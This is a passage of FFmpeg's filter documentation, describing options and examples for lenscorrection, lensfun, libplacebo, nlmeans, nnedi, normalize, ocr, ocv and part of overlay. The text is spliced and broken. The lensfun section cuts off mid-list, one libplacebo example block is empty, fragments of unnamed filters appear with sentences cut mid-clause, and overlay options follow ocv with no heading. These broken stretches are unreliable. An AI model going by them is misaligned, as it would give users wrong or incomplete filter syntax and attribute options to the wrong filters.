### [11.142 lenscorrection](#toc-lenscorrection)

Correct radial lens distortion

This filter can be used to correct for radial distortion as can result from the use
of wide angle lenses, and thereby re-rectify the image. To find the right parameters
one can use tools available for example as part of opencv or simply trial-and-error.
To use opencv use the calibration sample (under samples/cpp) from the opencv sources
and extract the k1 and k2 coefficients from the resulting matrix.

Note that effectively the same filter is available in the open-source tools Krita and
Digikam from the KDE project.

In contrast to the [vignette](#vignette) filter, which can also be used to compensate lens errors,
this filter corrects the distortion of the image, whereas [vignette](#vignette) corrects the
brightness distribution, so you may want to use both filters together in certain
cases, though you will have to take care of ordering, i.e. whether vignetting should
be applied before or after lens correction.

#### [11.142.1 Options](#toc-Options)

The filter accepts the following options:

`cx`

Relative x-coordinate of the focal point of the image, and thereby the center of the
distortion. This value has a range [0,1] and is expressed as fractions of the image
width. Default is 0.5.

`cy`

Relative y-coordinate of the focal point of the image, and thereby the center of the
distortion. This value has a range [0,1] and is expressed as fractions of the image
height. Default is 0.5.

`k1`

Coefficient of the quadratic correction term. This value has a range [-1,1]. 0 means
no correction. Default is 0.

`k2`

Coefficient of the double quadratic correction term. This value has a range [-1,1].
0 means no correction. Default is 0.

`i`

Set interpolation type. Can be `nearest` or `bilinear`.
Default is `nearest`.

`fc`

Specify the color of the unmapped pixels. For the syntax of this option,
check the [(ffmpeg-utils)"Color" section in the ffmpeg-utils
manual](ffmpeg-utils.html#color-syntax). Default color is `black@0`.

The formula that generates the correction is:

r\_src = r\_tgt \* (1 + k1 \* (r\_tgt / r\_0)^2 + k2 \* (r\_tgt / r\_0)^4)

where r\_0 is halve of the image diagonal and r\_src and r\_tgt are the
distances from the focal point in the source and target images, respectively.

#### [11.142.2 Commands](#toc-Commands-104)

This filter supports the all above options as [commands](#commands).

### [11.143 lensfun](#toc-lensfun)

Apply lens correction via the lensfun library (<http://lensfun.sourceforge.net/>).

The `lensfun` filter requires the camera make, camera model, and lens model
to apply the lens correction. The filter will load the lensfun database and
query it to find the corresponding camera and lens entries in the database. As
long as these entries can be found with the given options, the filter can
perform corrections on frames. Note that incomplete strings will result in the
filter choosing the best match with the given options, and the filter will
output the chosen camera and lens models (logged with level "info"). You must
provide the make, camera model, and lens model as they are required.

To obtain a list of available makes and models, leave out one or both of `make` and
`model` options. The filter will send the full list to the log with level `INFO`.
The first column is the make and the second column is the model.
To obtain a list of available lenses, set any values for make and model and leave out the
`lens_model` option. The filter will send the full list of lenses in the log with level
`INFO`. The ffmpeg tool will exit after the list is printed.

The filter accepts the following options:

`make`

The make of the camera (for example, "Canon"). This option is required.

`model`

The model of the camera (for example, "Canon EOS 100D"). This option is
required.

`lens_model`

The model of the lens (for example, "Canon EF-S 18-55mm f/3.5-5.6 IS STM"). This
option is required.

`db_path`

The full path to the lens database folder. If not set, the filter will attempt to
load the database from the install path when the library was built. Default is unset.

`mode`

The type of correction to apply. The following values are valid options:

‘`vignetting`’

Enables fixing lens vignetting.

‘`geometry`’

Enables fixing lens geometry. This is the default.

‘`subpixel`’

Enables fixing chromatic aberrations.

‘`vig_geo`’

Enables fixing lens vignetting and lens geometry.

‘`vig_subpixel`’

Enables fixing lens vignetting and chromatic aberrations.

‘`distortion`’

Enables fixing both lens geometry and chromatic aberrations.

‘`all`’

Enables all possible corrections.

`focal_length`

The focal length of the image/video (zoom; expected constant for video). For
example, a 18–55mm lens has focal length range of [18–55], so a value in that
range should be chosen when using that lens. Default 18.

`aperture`

The aperture of the image/video (expected constant for video). Note that
aperture is only used for vignetting correction. Default 3.5.

`focus_distance`

The focus distance of the image/video (expected constant for video). Note that
focus distance is only used for vignetting and only slightly affects the
vignetting correction process. If unknown, leave it at the default value (which
is 1000).

`scale`

The scale factor which is applied after transformation. After correction the
video is no longer necessarily rectangular. This parameter controls how much of
the resulting image is visible. The value 0 means that a value will be chosen
automatically such that there is little or no unmapped area in the output
image. 1.0 means that no additional scaling is done. Lower values may result
in more of the corrected image being visible, while higher values may avoid
unmapped areas in the output.

`target_geometry`

### [11.144 lcevc](#toc-lcevc)

Low Complexity Enhancement Video Codec filter based on liblcevc\_dec
(<https://github.com/v-novaltd/LCEVCdec>).

### [11.145 libplacebo](#toc-libplacebo)

Flexible GPU-accelerated processing filter based on libplacebo
(<https://code.videolan.org/videolan/libplacebo>).

#### [11.145.1 Options](#toc-Options-1)

The options for this filter are divided into the following sections:

#### [11.145.1.1 Output mode](#toc-Output-mode)

These options control the overall output mode. By default, libplacebo will try
to preserve the source colorimetry and size as best as it can, but it will
apply any embedded film grain, dolby vision metadata or anamorphic SAR present
in source frames.

`inputs`

Set the number of inputs. This can be used, alongside the `idx` variable,
to allow placing/blending multiple inputs inside the output frame. This
effectively enables functionality similar to [hstack](#hstack), [overlay](#overlay), etc.

`w`
`h`

Set the output video dimension expression. Default values are `iw` and
`ih`.

Allows for the same expressions as the [scale](#scale) filter.

`crop_x`
`crop_y`

Set the input crop x/y expressions, default values are `(iw-cw)/2` and
`(ih-ch)/2`.

`crop_w`
`crop_h`

Set the input crop width/height expressions, default values are `iw` and
`ih`.

`pos_x`
`pos_y`

Set the output placement x/y expressions, default values are `(ow-pw)/2`
and `(oh-ph)/2`.

`pos_w`
`pos_h`

Set the output placement width/height expressions, default values are `ow`
and `oh`.

`fps`

Set the output frame rate. This can be rational, e.g. `60000/1001`. If
set to the special string `none` (the default), input timestamps will
instead be passed through to the output unmodified. Otherwise, the input video
frames will be interpolated as necessary to rescale the video to the specified
target framerate, in a manner as determined by the `frame_mixer` option.

`format`

Set the output format override. If unset (the default), frames will be output
in the same format as the respective input frames. Otherwise, format conversion
will be performed.

`force_original_aspect_ratio`
`force_divisible_by`

Work the same as the identical [scale](#scale) filter options.

`normalize_sar`

If enabled, output frames will always have a pixel aspect ratio of 1:1. This
will introduce additional padding/cropping as necessary. If disabled (the
default), any aspect ratio mismatches, including those from e.g. anamorphic
video sources, are forwarded to the output pixel aspect ratio.

`pad_crop_ratio`

Specifies a ratio (between `0.0` and `1.0`) between padding and
cropping when the input aspect ratio does not match the output aspect ratio and
`normalize_sar` is in effect. The default of `0.0` always pads the
content with black borders, while a value of `1.0` always crops off parts
of the content. Intermediate values are possible, leading to a mix of the two
approaches.

`fillcolor`

Set the color used to fill the output area not covered by the output image, for
example as a result of `normalize_sar`. For the general syntax of this
option, check the [(ffmpeg-utils)"Color" section in the ffmpeg-utils
manual](ffmpeg-utils.html#color-syntax). Defaults to `black`.

`corner_rounding`

Render frames with rounded corners. The value, given as a float ranging from
`0.0` to `1.0`, indicates the relative degree of rounding, from fully
square to fully circular. In other words, it gives the radius divided by half
the smaller side length. Defaults to `0.0`.

`extra_opts`

Pass extra libplacebo internal configuration options. These can be specified
as a list of key=value pairs separated by ’:’. The following example
shows how to configure a custom filter kernel ("EWA LanczosSharp") and use it
to double the input image resolution:

```
-vf "libplacebo=w=iw*2:h=ih*2:extra_opts='upscaler=custom\:upscaler_preset=ewa_lanczos\:upscaler_blur=0.9812505644269356'"

```

`colorspace`
`color_primaries`
`color_trc`
`range`

Configure the colorspace that output frames will be delivered in. The default
value of `auto` outputs frames in the same format as the input frames,
leading to no change. For any other value, conversion will be performed.

See the [setparams](#setparams) filter for a list of possible values.

`apply_filmgrain`

Apply film grain (e.g. AV1 or H.274) if present in source frames, and strip
it from the output. Enabled by default.

`apply_dolbyvision`

Apply Dolby Vision RPU metadata if present in source frames, and strip it from
the output. Enabled by default. Note that Dolby Vision will always output
BT.2020+PQ, overriding the usual input frame metadata. These will also be
picked as the values of `auto` for the respective frame output options.

In addition to the expression constants documented for the [scale](#scale) filter,
the `crop_w`, `crop_h`, `crop_x`, `crop_y`,
`pos_w`, `pos_h`, `pos_x` and `pos_y` options can
also contain the following constants:

`in_idx, idx`

The (0-based) numeric index of the currently active input stream.

`crop_w, cw`
`crop_h, ch`

The computed values of `crop_w` and `crop_h`.

`pos_w, pw`
`pos_h, ph`

The computed values of `pos_w` and `pos_h`.

`in_t, t`

The input frame timestamp, in seconds. NAN if input timestamp is unknown.

`out_t, ot`

The input frame timestamp, in seconds. NAN if input timestamp is unknown.

`n`

The input frame number, starting with 0.

#### [11.145.1.2 Scaling](#toc-Scaling)

The options in this section control how libplacebo performs upscaling and (if
necessary) downscaling. Note that libplacebo will always internally operate on
4:4:4 content, so any sub-sampled chroma formats such as `yuv420p` will
necessarily be upsampled and downsampled as part of the rendering process. That
means scaling might be in effect even if the source and destination resolution
are the same.

`upscaler`
`downscaler`

Configure the filter kernel used for upscaling and downscaling. The respective
defaults are `spline36` and `mitchell`. For a full list of possible
values, pass `help` to these options. The most important values are:

‘`none`’

Forces the use of built-in GPU texture sampling (typically bilinear). Extremely
fast but poor quality, especially when downscaling.

‘`bilinear`’

Bilinear interpolation. Can generally be done for free on GPUs, except when
doing so would lead to aliasing. Fast and low quality.

‘`nearest`’

Nearest-neighbour interpolation. Sharp but highly aliasing.

‘`oversample`’

Algorithm that looks visually similar to nearest-neighbour interpolation but
tries to preserve pixel aspect ratio. Good for pixel art, since it results in
minimal distortion of the artistic appearance.

‘`lanczos`’

Standard sinc-sinc interpolation kernel.

‘`spline36`’

Cubic spline approximation of lanczos. No difference in performance, but has
very slightly less ringing.

‘`ewa_lanczos`’

Elliptically weighted average version of lanczos, based on a jinc-sinc kernel.
This is also popularly referred to as just "Jinc scaling". Slow but very high
quality.

‘`gaussian`’

Gaussian kernel. Has certain ideal mathematical properties, but subjectively
very blurry.

‘`mitchell`’

Cubic BC spline with parameters recommended by Mitchell and Netravali. Very
little ringing.

`frame_mixer`

Controls the kernel used for mixing frames temporally. The default value is
`none`, which disables frame mixing. For a full list of possible values,
pass `help` to this option. The most important values are:

‘`none`’

Disables frame mixing, giving a result equivalent to "nearest neighbour"
semantics.

‘`oversample`’

Oversamples the input video to create a "Smooth Motion"-type effect: if an
output frame would exactly fall on the transition between two video frames, it
is blended according to the relative overlap. This is the recommended option
whenever preserving the original subjective appearance is desired.

‘`mitchell_clamp`’

Larger filter kernel that smoothly interpolates multiple frames in a manner
designed to eliminate ringing and other artefacts as much as possible. This is
the recommended option wherever maximum visual smoothness is desired.

‘`linear`’

Linear blend/fade between frames. Especially useful for constructing e.g.
slideshows.

`lut_entries`

Configures the size of scaler LUTs, ranging from `1` to `256`. The
default of `0` will pick libplacebo’s internal default, typically
`64`.

`antiringing`

Enables anti-ringing (for non-EWA filters). The value (between `0.0` and
`1.0`) configures the strength of the anti-ringing algorithm. May increase
aliasing if set too high. Disabled by default.

`sigmoid`

Enable sigmoidal compression during upscaling. Reduces ringing slightly.
Enabled by default.

#### [11.145.1.3 Debanding](#toc-Debanding)

Libplacebo comes with a built-in debanding filter that is good at counteracting
many common sources of banding and blocking. Turning this on is highly
recommended whenever quality is desired.

`deband`

Enable (fast) debanding algorithm. Disabled by default.

`deband_iterations`

Number of deband iterations of the debanding algorithm. Each iteration is
performed with progressively increased radius (and diminished threshold).
Recommended values are in the range `1` to `4`. Defaults to `1`.

`deband_threshold`

Debanding filter strength. Higher numbers lead to more aggressive debanding.
Defaults to `4.0`.

`deband_radius`

Debanding filter radius. A higher radius is better for slow gradients, while
a lower radius is better for steep gradients. Defaults to `16.0`.

`deband_grain`

Amount of extra output grain to add. Helps hide imperfections. Defaults to
`6.0`.

#### [11.145.1.4 Color adjustment](#toc-Color-adjustment)

A collection of subjective color controls. Not very rigorous, so the exact
effect will vary somewhat depending on the input primaries and colorspace.

`brightness`

Brightness boost, between `-1.0` and `1.0`. Defaults to `0.0`.

`contrast`

Contrast gain, between `0.0` and `16.0`. Defaults to `1.0`.

`saturation`

Saturation gain, between `0.0` and `16.0`. Defaults to `1.0`.

`hue`

Hue shift in radians, between `-3.14` and `3.14`. Defaults to
`0.0`. This will rotate the UV subvector, defaulting to BT.709
coefficients for RGB inputs.

`gamma`

Gamma adjustment, between `0.0` and `16.0`. Defaults to `1.0`.

`cones`

Cone model to use for color blindness simulation. Accepts any combination of
`l`, `m` and `s`. Here are some examples:

‘`m`’

Deuteranomaly / deuteranopia (affecting 3%-4% of the population)

‘`l`’

Protanomaly / protanopia (affecting 1%-2% of the population)

‘`l+m`’

Monochromacy (very rare)

‘`l+m+s`’

Achromatopsy (complete loss of daytime vision, extremely rare)

`cone-strength`

Gain factor for the cones specified by `cones`, between `0.0` and
`10.0`. A value of `1.0` results in no change to color vision. A
value of `0.0` (the default) simulates complete loss of those cones. Values
above `1.0` result in exaggerating the differences between cones, which
may help compensate for reduced color vision.

#### [11.145.1.5 Peak detection](#toc-Peak-detection)

To help deal with sources that only have static HDR10 metadata (or no tagging
whatsoever), libplacebo uses its own internal frame analysis compute shader to
analyze source frames and adapt the tone mapping function in realtime. If this
is too slow, or if exactly reproducible frame-perfect results are needed, it’s
recommended to turn this feature off.

`peak_detect`

Enable HDR peak detection. Ignores static MaxCLL/MaxFALL values in favor of
dynamic detection from the input. Note that the detected values do not get
written back to the output frames, they merely guide the internal tone mapping
process. Enabled by default.

`smoothing_period`

Peak detection smoothing period, between `0.0` and `1000.0`. Higher
values result in peak detection becoming less responsive to changes in the
input. Defaults to `100.0`.

`minimum_peak`

Lower bound on the detected peak (relative to SDR white), between `0.0`
and `100.0`. Defaults to `1.0`.

`scene_threshold_low`
`scene_threshold_high`

Lower and upper thresholds for scene change detection. Expressed in a
logarithmic scale between `0.0` and `100.0`. Default to `5.5`
and `10.0`, respectively. Setting either to a negative value disables
this functionality.

`percentile`

Which percentile of the frame brightness histogram to use as the source peak
for tone-mapping. Defaults to `99.995`, a fairly conservative value.
Setting this to `100.0` disables frame histogram measurement and instead
uses the true peak brightness for tone-mapping.

#### [11.145.1.6 Tone mapping](#toc-Tone-mapping)

The options in this section control how libplacebo performs tone-mapping and
gamut-mapping when dealing with mismatches between wide-gamut or HDR content.
In general, libplacebo relies on accurate source tagging and mastering display
gamut information to produce the best results.

`gamut_mode`

How to handle out-of-gamut colors that can occur as a result of colorimetric
gamut mapping.

‘`clip`’

Do nothing, simply clip out-of-range colors to the RGB volume. Low quality but
extremely fast.

‘`perceptual`’

Perceptually soft-clip colors to the gamut volume. This is the default.

‘`relative`’

Relative colorimetric hard-clip. Similar to `perceptual` but without
the soft knee.

‘`saturation`’

Saturation mapping, maps primaries directly to primaries in RGB space.
Not recommended except for artificial computer graphics for which a bright,
saturated display is desired.

‘`absolute`’

Absolute colorimetric hard-clip. Performs no adjustment of the white point.

‘`desaturate`’

Hard-desaturates out-of-gamut colors towards white, while preserving the
luminance. Has a tendency to distort the visual appearance of bright objects.

‘`darken`’

Linearly reduces content brightness to preserves saturated details, followed by
clipping the remaining out-of-gamut colors.

‘`warn`’

Highlight out-of-gamut pixels (by inverting/marking them).

‘`linear`’

Linearly reduces chromaticity of the entire image to make it fit within the
target color volume. Be careful when using this on BT.2020 sources without
proper mastering metadata, as doing so will lead to excessive desaturation.

`tonemapping`

Tone-mapping algorithm to use. Available values are:

‘`auto`’

Automatic selection based on internal heuristics. This is the default.

‘`clip`’

Performs no tone-mapping, just clips out-of-range colors. Retains perfect color
accuracy for in-range colors but completely destroys out-of-range information.
Does not perform any black point adaptation. Not configurable.

‘`st2094-40`’

EETF from SMPTE ST 2094-40 Annex B, which applies the Bezier curves from HDR10+
dynamic metadata based on Bezier curves to perform tone-mapping. The OOTF used
is adjusted based on the ratio between the targeted and actual display peak
luminances.

‘`st2094-10`’

EETF from SMPTE ST 2094-10 Annex B.2, which takes into account the input signal
average luminance in addition to the maximum/minimum. The configurable contrast
parameter influences the slope of the linear output segment, defaulting to
`1.0` for no increase/decrease in contrast. Note that this does not
currently include the subjective gain/offset/gamma controls defined in Annex
B.3.

‘`bt.2390`’

EETF from the ITU-R Report BT.2390, a hermite spline roll-off with linear
segment. The knee point offset is configurable. Note that this parameter
defaults to `1.0`, rather than the value of `0.5` from the ITU-R
spec.

‘`bt.2446a`’

EETF from ITU-R Report BT.2446, method A. Designed for well-mastered HDR
sources. Can be used for both forward and inverse tone mapping. Not
configurable.

‘`spline`’

Simple spline consisting of two polynomials, joined by a single pivot point.
The parameter gives the pivot point (in PQ space), defaulting to `0.30`.
Can be used for both forward and inverse tone mapping.

‘`reinhard`’

Simple non-linear, global tone mapping algorithm. The parameter specifies the
local contrast coefficient at the display peak. Essentially, a parameter of
`0.5` implies that the reference white will be about half as bright as
when clipping. Defaults to `0.5`, which results in the simplest
formulation of this function.

‘`mobius`’

Generalization of the reinhard tone mapping algorithm to support an additional
linear slope near black. The tone mapping parameter indicates the trade-off
between the linear section and the non-linear section. Essentially, for a given
parameter x, every color value below x will be mapped linearly,
while higher values get non-linearly tone-mapped. Values near `1.0` make
this curve behave like `clip`, while values near `0.0` make this
curve behave like `reinhard`. The default value is `0.3`, which
provides a good balance between colorimetric accuracy and preserving
out-of-gamut details.

‘`hable`’

Piece-wise, filmic tone-mapping algorithm developed by John Hable for use in
Uncharted 2, inspired by a similar tone-mapping algorithm used by Kodak.
Popularized by its use in video games with HDR rendering. Preserves both dark
and bright details very well, but comes with the drawback of changing the
average brightness quite significantly. This is sort of similar to
`reinhard` with parameter `0.24`.

‘`gamma`’

Fits a gamma (power) function to transfer between the source and target color
spaces, effectively resulting in a perceptual hard-knee joining two roughly
linear sections. This preserves details at all scales fairly accurately, but
can result in an image with a muted or dull appearance. The parameter is used
as the cutoff point, defaulting to `0.5`.

‘`linear`’

Linearly stretches the input range to the output range, in PQ space. This will
preserve all details accurately, but results in a significantly different
average brightness. Can be used for inverse tone-mapping in addition to regular
tone-mapping. The parameter can be used as an additional linear gain
coefficient (defaulting to `1.0`).

`tonemapping_param`

For tunable tone mapping functions, this parameter can be used to fine-tune the
curve behavior. Refer to the documentation of `tonemapping`. The default
value of `0.0` is replaced by the curve’s preferred default setting.

`inverse_tonemapping`

If enabled, this filter will also attempt stretching SDR signals to fill HDR
output color volumes. Disabled by default.

`tonemapping_lut_size`

Size of the tone-mapping LUT, between `2` and `1024`. Defaults to
`256`. Note that this figure is squared when combined with
`peak_detect`.

`contrast_recovery`

Contrast recovery strength. If set to a value above `0.0`, the source
image will be divided into high-frequency and low-frequency components, and a
portion of the high-frequency image is added back onto the tone-mapped output.
May cause excessive ringing artifacts for some HDR sources, but can improve the
subjective sharpness and detail left over in the image after tone-mapping.
Defaults to `0.30`.

`contrast_smoothness`

Contrast recovery lowpass kernel size. Defaults to `3.5`. Increasing or
decreasing this will affect the visual appearance substantially. Has no effect
when `contrast_recovery` is disabled.

#### [11.145.1.7 Dithering](#toc-Dithering)

By default, libplacebo will dither whenever necessary, which includes rendering
to any integer format below 16-bit precision. It’s recommended to always leave
this on, since not doing so may result in visible banding in the output, even
if the `debanding` filter is enabled. If maximum performance is needed,
use `ordered_fixed` instead of disabling dithering.

`dithering`

Dithering method to use. Accepts the following values:

‘`none`’

Disables dithering completely. May result in visible banding.

‘`blue`’

Dither with pseudo-blue noise. This is the default.

‘`ordered`’

Tunable ordered dither pattern.

‘`ordered_fixed`’

Faster ordered dither with a fixed size of `6`. Texture-less.

‘`white`’

Dither with white noise. Texture-less.

`dither_lut_size`

Dither LUT size, as log base2 between `1` and `8`. Defaults to
`6`, corresponding to a LUT size of `64x64`.

`dither_temporal`

Enables temporal dithering. Disabled by default.

#### [11.145.1.8 Custom shaders](#toc-Custom-shaders)

libplacebo supports a number of custom shaders based on the mpv .hook GLSL
syntax. A collection of such shaders can be found here:
<https://github.com/mpv-player/mpv/wiki/User-Scripts#user-shaders>

A full description of the mpv shader format is beyond the scope of this
section, but a summary can be found here:
<https://mpv.io/manual/master/#options-glsl-shader>

`custom_shader_path`

Specifies a path to a custom shader file to load at runtime.

`custom_shader_bin`

Specifies a complete custom shader as a raw string.

#### [11.145.1.9 Debugging / performance](#toc-Debugging-_002f-performance)

All of the options in this section default off. They may be of assistance when
attempting to squeeze the maximum performance at the cost of quality.

`skip_aa`

Disable anti-aliasing when downscaling.

`polar_cutoff`

Truncate polar (EWA) scaler kernels below this absolute magnitude, between
`0.0` and `1.0`.

`disable_linear`

Disable linear light scaling.

`disable_builtin`

Disable built-in GPU sampling (forces LUT).

`disable_fbos`

Forcibly disable FBOs, resulting in loss of almost all functionality, but
offering the maximum possible speed.

#### [11.145.2 Commands](#toc-Commands-105)

This filter supports almost all of the above options as [commands](#commands).

#### [11.145.3 Examples](#toc-Examples-91)

* Tone-map input to standard gamut BT.709 output:
  ```
  libplacebo=colorspace=bt709:color_primaries=bt709:color_trc=bt709:range=tv

  ```
* Rescale input to fit into standard 1080p, with high quality scaling:
  ```

  ```
* Interpolate low FPS / VFR input to smoothed constant 60 fps output:
  ```
  libplacebo=fps=60:frame_mixer=mitchell_clamp

  ```
* Convert input to standard sRGB JPEG:
  ```
  libplacebo=format=yuv420p:colorspace=bt470bg:color_primaries=bt709:color_trc=iec61966-2-1:range=pc

  ```
* Use higher quality debanding settings:
  ```
  libplacebo=deband=true:deband_iterations=3:deband_radius=8:deband_threshold=6

  ```

  ```
* Suppress CPU-based AV1/H.274 film grain application in the decoder, in favor of
  doing it with this filter. Note that this is only a gain if the frames are
  either already on the GPU, or if you’re using libplacebo for other purposes,
  since otherwise the VRAM roundtrip will more than offset any expected speedup.
  ```
  ffmpeg -export_side_data +film_grain ... -vf libplacebo=apply_filmgrain=true

  ```
* Interop with VAAPI hwdec to avoid round-tripping through RAM:

fixing movies that were inverse-telecined incorrectly.

A description of the accepted options follows.

`max`

Set the maximum number of consecutive frames which can be dropped (if

corresponds to 1 unit of difference for each pixel, or the same spread
out differently over the block.

A frame is a candidate for dropping if no 8x8 blocks differ by more
than a threshold of `hi`, and if no more than `frac` blocks (1

have the same number of frames, which are compared one by one.

The obtained per component, average, min and max MSAD is printed through
the logging system.

The filter stores the calculated MSAD of each frame in frame metadata.

This filter also supports the [framesync](#framesync) options.

In the below example the input file `main.mpg` being processed is compared
with the reference file `ref.mpg`.

```
ffmpeg -i main.mpg -i ref.mpg -lavfi msad -f null -

```

This filter supports same [commands](#commands) as options.

### [11.175 nlmeans](#toc-nlmeans-1)

Denoise frames using Non-Local Means algorithm.

Each pixel is adjusted by looking for other pixels with similar contexts. This
context similarity is defined by comparing their surrounding patches of size
`p`x`p`. Patches are searched in an area of `r`x`r`
around the pixel.

Note that the research area defines centers for patches, which means some
patches will be made of pixels outside that research area.

`s`

Set denoising strength. Default is 1.0. Must be in range [1.0, 30.0].

`p`

Set patch size. Default is 7. Must be odd number in range [0, 99].

`pc`

Same as `p` but for chroma planes.

The default value is 0 and means automatic.

`r`

Set research size. Default is 15. Must be odd number in range [0, 99].

`rc`

Same as `r` but for chroma planes.

The default value is 0 and means automatic.

### [11.176 nnedi](#toc-nnedi)

Deinterlace video using neural network edge directed interpolation.

This filter accepts the following options:

`weights`

Mandatory option, without binary file filter can not work.
Currently file can be found here:
https://github.com/dubhater/vapoursynth-nnedi3/blob/master/src/nnedi3\_weights.bin

`deint`

‘`a`’

Use frame flags, single field.

‘`t`’

Use top field only.

‘`b`’

Use bottom field only.

‘`tf`’

Use both fields, top first.

‘`bf`’

Use both fields, bottom first.

`planes`

Set which planes to process, by default filter process all frames.

`nsize`

Set size of local neighborhood around each pixel, used by the predictor neural
network.

Can be one of the following:

‘`s8x6`’
‘`s16x6`’
‘`s32x6`’
‘`s48x6`’
‘`s8x4`’
‘`s16x4`’
‘`s32x4`’

`nns`

Set the number of neurons in predictor neural network.

`qual`

Controls the number of different neural network predictions that are blended
together to compute the final output value. Can be `fast`, default or
`slow`.

`etype`

Set which set of weights to use in the predictor.
Can be one of the following:

‘`a, abs`’

weights trained to minimize absolute error

‘`s, mse`’

weights trained to minimize squared error

`pscrn`

Controls whether or not the prescreener neural network is used to decide
which pixels should be processed by the predictor neural network and which
can be handled by simple cubic interpolation.
The prescreener is trained to know whether cubic interpolation will be
sufficient for a pixel or whether it should be predicted by the predictor nn.
The computational complexity of the prescreener nn is much less than that of
the predictor nn. Since most pixels can be handled by cubic interpolation,
using the prescreener generally results in much faster processing.
The prescreener is pretty accurate, so the difference between using it and not
using it is almost always unnoticeable.

Can be one of the following:

‘`none`’
‘`original`’
‘`new`’
‘`new2`’
‘`new3`’

Default is `new`.

#### [11.176.1 Commands](#toc-Commands-125)

### [11.179 normalize](#toc-normalize)

Normalize RGB video (aka histogram stretching, contrast stretching).
See: https://en.wikipedia.org/wiki/Normalization\_(image\_processing)

For each channel of each frame, the filter computes the input range and maps
it linearly to the user-specified output range. The output range defaults
to the full dynamic range from pure black to pure white.

Temporal smoothing can be used on the input range to reduce flickering (rapid
changes in brightness) caused when small dark or bright objects enter or leave
the scene. This is similar to the auto-exposure (automatic gain control) on a
video camera, and, like a video camera, it may cause a period of over- or
under-exposure of the video.

The R,G,B channels can be normalized independently, which may cause some
color shifting, or linked together as a single channel, which prevents
color shifting. Linked normalization preserves hue. Independent normalization
does not, so it can be used to remove some color casts. Independent and linked
normalization can be combined in any ratio.

The normalize filter accepts the following options:

`blackpt`
`whitept`

Colors which define the output range. The minimum input value is mapped to
the blackpt. The maximum input value is mapped to the whitept.
The defaults are black and white respectively. Specifying white for
blackpt and black for whitept will give color-inverted,
normalized video. Shades of grey can be used to reduce the dynamic range
(contrast). Specifying saturated colors here can create some interesting
effects.

`smoothing`

The number of previous frames to use for temporal smoothing. The input range
of each channel is smoothed using a rolling average over the current frame
and the smoothing previous frames. The default is 0 (no temporal
smoothing).

`independence`

Controls the ratio of independent (color shifting) channel normalization to
linked (color preserving) normalization. 0.0 is fully linked, 1.0 is fully
independent. Defaults to 1.0 (fully independent).

`strength`

Overall strength of the filter. 1.0 is full strength. 0.0 is a rather
expensive no-op. Defaults to 1.0 (full strength).

#### [11.179.1 Commands](#toc-Commands-126)

This filter supports same [commands](#commands) as options, excluding smoothing option.
The command accepts the same syntax of the corresponding option.

If the specified expression is not valid, it is kept at its current
value.

#### [11.179.2 Examples](#toc-Examples-100)

Stretch video contrast to use the full dynamic range, with no temporal
smoothing; may flicker depending on the source content:

```
normalize=blackpt=black:whitept=white:smoothing=0

```

As above, but with 50 frames of temporal smoothing; flicker should be
reduced, depending on the source content:

```
normalize=blackpt=black:whitept=white:smoothing=50

```

As above, but with hue-preserving linked channel normalization:

```
normalize=blackpt=black:whitept=white:smoothing=50:independence=0

```

As above, but with half strength:

```
normalize=blackpt=black:whitept=white:smoothing=50:independence=0:strength=0.5

```

Map the darkest input color to red, the brightest input color to cyan:

```
normalize=blackpt=red:whitept=cyan

```

### [11.180 null](#toc-null)

Pass the video source unchanged to the output.

### [11.181 ocr](#toc-ocr)

Optical Character Recognition

This filter uses Tesseract for optical character recognition. To enable
compilation of this filter, you need to configure FFmpeg with
`--enable-libtesseract`.

It accepts the following options:

`datapath`

Set datapath to tesseract data. Default is to use whatever was
set at installation.

`language`

Set language, default is "eng".

`whitelist`

Set character whitelist.

`blacklist`

Set character blacklist.

The filter exports recognized text as the frame metadata `lavfi.ocr.text`.
The filter exports confidence of recognized words as the frame metadata `lavfi.ocr.confidence`.

### [11.182 ocv](#toc-ocv)

Apply a video transform using libopencv.

To enable this filter, install the libopencv library and headers and
configure FFmpeg with `--enable-libopencv`.

It accepts the following parameters:

`filter_name`

The name of the libopencv filter to apply.

`filter_params`

The parameters to pass to the libopencv filter. If not specified, the default
values are assumed.

Refer to the official libopencv documentation for more precise
information:
<http://docs.opencv.org/master/modules/imgproc/doc/filtering.html>

Several libopencv filters are supported; see the following subsections.

#### [11.182.1 dilate](#toc-dilate-1)

Dilate an image by using a specific structuring element.
It corresponds to the libopencv function `cvDilate`.

It accepts the parameters: struct\_el|nb\_iterations.

struct\_el represents a structuring element, and has the syntax:
colsxrows+anchor\_xxanchor\_y/shape

cols and rows represent the number of columns and rows of
the structuring element, anchor\_x and anchor\_y the anchor
point, and shape the shape for the structuring element. shape
must be "rect", "cross", "ellipse", or "custom".

If the value for shape is "custom", it must be followed by a
string of the form "=filename". The file with name
filename is assumed to represent a binary image, with each
printable character corresponding to a bright pixel. When a custom
shape is used, cols and rows are ignored, the number
or columns and rows of the read file are assumed instead.

The default value for struct\_el is "3x3+0x0/rect".

nb\_iterations specifies the number of times the transform is
applied to the image, and defaults to 1.

Some examples:

```
# Use the default values
ocv=dilate

# Dilate using a structuring element with a 5x5 cross, iterating two times
ocv=filter_name=dilate:filter_params=5x5+2x2/cross|2

# Read the shape from the file diamond.shape, iterating two times.
# The file diamond.shape may contain a pattern of characters like this
#   *
#  ***
# *****
#  ***
#   *
# The specified columns and rows are ignored
# but the anchor point coordinates are not
ocv=dilate:0x0+2x2/custom=diamond.shape|2

```

#### [11.182.2 erode](#toc-erode)

Erode an image by using a specific structuring element.

#### [11.182.3 smooth](#toc-smooth)

Smooth the input video.

The filter takes the following parameters:
type|param1|param2|param3|param4.

type is the type of smooth filter to apply, and must be one of
the following values: "blur", "blur\_no\_scale", "median", "gaussian",
or "bilateral". The default value is "gaussian".

The meaning of param1, param2, param3, and param4
depends on the smooth type. param1 and
param2 accept integer positive values or 0. param3 and
param4 accept floating point values.

The default value for param1 is 3. The default value for the
other parameters is 0.

These parameters correspond to the parameters assigned to the
libopencv function `cvSmooth`.

It takes two inputs and has one output. The first input is the "main"
video on which the second input is overlaid.

It accepts the following parameters:

A description of the accepted options follows.

`x`
`y`

Set the expression for the x and y coordinates of the overlaid video
on the main video. Default value is "0" for both expressions. In case
the expression is invalid, it is set to a huge value (meaning that the
overlay will not be displayed within the output visible area).

`eof_action`

See [framesync](#framesync).

`eval`

Set when the expressions for `x`, and `y` are evaluated.

It accepts the following values:

‘`init`’

only evaluate expressions once during the filter initialization or
when a command is processed

‘`frame`’

evaluate expressions for each incoming frame

Default value is ‘`frame`’.

`shortest`

See [framesync](#framesync).

`format`

Set the format for the output video.

It accepts the following values:

‘`yuv420`’

force YUV 4:2:0 8-bit planar output

